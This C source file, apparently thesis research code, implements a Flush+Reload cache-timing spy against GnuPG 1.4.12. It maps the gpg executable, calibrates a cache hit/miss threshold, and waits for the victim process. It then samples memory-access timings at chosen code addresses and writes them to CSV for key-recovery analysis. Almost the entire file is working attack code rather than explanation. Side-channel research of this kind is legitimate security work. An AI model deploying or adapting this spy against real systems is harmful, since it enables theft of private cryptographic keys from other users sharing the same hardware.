#define _GNU_SOURCE
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h> //open
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //close
#include <sched.h>
#include <pthread.h>
#include "../../Utils/assemblyinstructions.h"
#include "../../Utils/cachetechniques.h"
#include "../../Utils/csvutils.h"

#define handle_error(msg) \
	do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"

#define EXE_ADDRS_FILENAME "/home/root/thesis-code/exe_addresses.txt"

#define ANALYSIS_CSV_FILENAME "/home/root/thesis-code/static_analysis.csv"

#define MAX_ADDRS_TO_MONITOR 10

#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 300000

#define GPG_MAX_SIZE_BYTES 4194304

#define THRESHOLD 45

#define DELAYFORVICTIMACTIVITY 850

#define MAXIDLECOUNT 500

#define OUTPUTRAWDATA 1

unsigned long obtainthreshold() {
	const int MAX_TIME = 80;
	const int MAX_WITHOUT_NOISE_ARRAY = 5 * 1024;
	const int MID_ARRAY = 2 * 1024;
	unsigned int array[MAX_WITHOUT_NOISE_ARRAY];
	unsigned int hit_counts[MAX_TIME];
	unsigned int miss_counts[MAX_TIME];
	int i;

	memset(array, -1, MAX_WITHOUT_NOISE_ARRAY * sizeof(unsigned int));
	reload(array + MID_ARRAY);
	sched_yield();
	//4MB
	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		unsigned long time = reload(array + MID_ARRAY) / 5;
		hit_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}

	for (i = 0; i < 4 * 1024 * 1024; ++i) {
		flush(array + MID_ARRAY);
		unsigned long time = reload(array + MID_ARRAY) / 5;
		miss_counts[time > (MAX_TIME - 1) ? MAX_TIME - 1 : time]++;
		sched_yield();
	}
	unsigned int hit_max = 0;
	unsigned int hit_max_index = 0;
	unsigned int miss_min_index = 0;
	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < MAX_TIME; ++i) {
		printf("%3d: %10zu %10zu\n", i * 5, hit_counts[i], miss_counts[i]);
		if (hit_max < hit_counts[i]) {
			hit_max = hit_counts[i];
			hit_max_index = i;
		}
		if (miss_counts[i] > 3 && miss_min_index == 0)
			miss_min_index = i;
	}
	unsigned int nr_times_threshold = -1UL;
	unsigned int threshold = 0;

	for (i = hit_max_index; i < miss_min_index; ++i) {
		if (nr_times_threshold > (hit_counts[i] + miss_counts[i])) {
			nr_times_threshold = hit_counts[i] + miss_counts[i];
			threshold = i;
		}
	}
	return threshold * 5;
}

long int getaddrstomonitor(const char* exeaddrsfilename, long int* out_addrs) {
	FILE* ptr_addrs = fopen(exeaddrsfilename, "r");
	if (ptr_addrs == NULL)
		handle_error("fopen_exeaddrsfilename");
	unsigned int linesize = 0, linelength = 0;
	char* line = malloc(256 * sizeof(char*));
	char* pEnd;
	long int nr_addrs = 0;
	int i;

	if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
		handle_error("getline_nr_addrs <= 0");
	line[linelength - 1] = '\0';
	nr_addrs = strtol(line, &pEnd, 10);
	if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
		handle_error("strtol_nr_addrs != \\r or \\n or \\0");

	long int addraux;

	for (i = 0; i < nr_addrs; ++i) {
		if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
			handle_error("getline_addrs <= 0");
		addraux = strtol(line, &pEnd, 0);
		if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
			handle_error("strtol_addrs != \\r or \\n or \\0");
		out_addrs[i] = addraux;
	}
	free(line);
	fclose(ptr_addrs);
	return nr_addrs;
}

int setcoreaffinity(int core_id) {
	int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
	if (core_id < 0 || core_id >= num_cores)
		handle_error("Wrong core id");
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(core_id, &cpuset);
	return sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

void delayloop(size_t cycles) {
	unsigned long long start = rdtscp();
	while ((rdtscp() - start) < cycles)
		;
}

int isvictimactive(unsigned int *analysis, int nr_addrs, int threshold) {
	int i;
	for (i = 0; i < nr_addrs; ++i) {
		if (analysis[i] < threshold)
			return 1;
	}
	return 0;
}

int missedvictimactivity(unsigned long long startcycles) {
	if (getcurrenttsc() > startcycles)
		return 1;
	while (getcurrenttsc() < startcycles)
		;
	return 0;
}

void analysealladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
		long int *exe_addrs, int nr_addrs, int threshold) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		char * aux = (char*) exe_addrs[addrs_index];
		char * ptr_to_monitor = aux + ptr_offset;
		unsigned int auxtsc = reloadandflush(ptr_to_monitor);
		if (OUTPUTRAWDATA)
			out_analysis[addrs_index] = auxtsc;
		else
			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
	}
}

void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
		long int *exe_addrs, int nr_addrs) {
	int addrs_index;
	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
		out_analysis[addrs_index] = 0;
	}
}

//void synchronouslyrungnupg(){
//	if (fork() == 0) {
//		//UNCOMMENT WHE ENCRYPT
//		//int errno = system(CMD_ENCRYPT_STR);
//
//		//COMMENT WHEN ENCRYPT
//		int errno = system(CMD_DECRYPT_STR);
//
//		if (errno == -1)
//			handle_error("system() running gnupg or removing files");
//		exit(0);
//	}
//}



int main() {
//	const unsigned long long threshold = obtainthreshold();
//	printf("THRESHOLD ::: %llu\n\r", threshold);
//	const unsigned long long THRESHOLD = 45;

	setcoreaffinity(0);

	int fd_exe;
	struct stat sbuff;
	char* mapping_addr;

	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
	int nr_addrs;

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES, PROT_READ, MAP_PRIVATE,
			fd_exe, 0);
	if (mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");

	//obtain the addrs to monitor
	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
	printf(".exe addrs obtained\n");

	unsigned long ptr_offset = (unsigned long) mapping_addr;
	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];

	//monitor .exe addrs
	printf(".exe addrs monitor\n");

	//Begin NEW
	unsigned long long start = getcurrenttsc();
	analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
	THRESHOLD);
	do {
		do {
			start += DELAYFORVICTIMACTIVITY;
		} while (missedvictimactivity(start));
		analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
		THRESHOLD);
	} while (!isvictimactive(analysis_array[0], nr_addrs,
	OUTPUTRAWDATA ? THRESHOLD : 2));

	int idle = 0, i = 1, missedactivity = 0, missrate = 0;

	for (i = 1, idle = 0;
			idle < MAXIDLECOUNT && i < MAX_TIMES_TO_MONITOR_EACH_ADDRS;
			++idle, ++i) {
		if (!missedactivity) {
			analysealladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs,
			THRESHOLD);
			if (isvictimactive(analysis_array[i], nr_addrs,
			OUTPUTRAWDATA ? THRESHOLD : 2))
				idle = 0;
		} else {
			missedalladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs);
			++missrate;
		}

		start += DELAYFORVICTIMACTIVITY;
		missedactivity = missedvictimactivity(start);

	}
	//End NEW

	//results to csv file
	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs, i, nr_addrs,
			analysis_array);
	printf(".exe results to csv file\n");

	printf("Missed samples: %d\n", missrate);
	printf("Samples: %d\n", i);

	munmap(mapping_addr, sbuff.st_size);
	close(fd_exe);
	return 0;

}
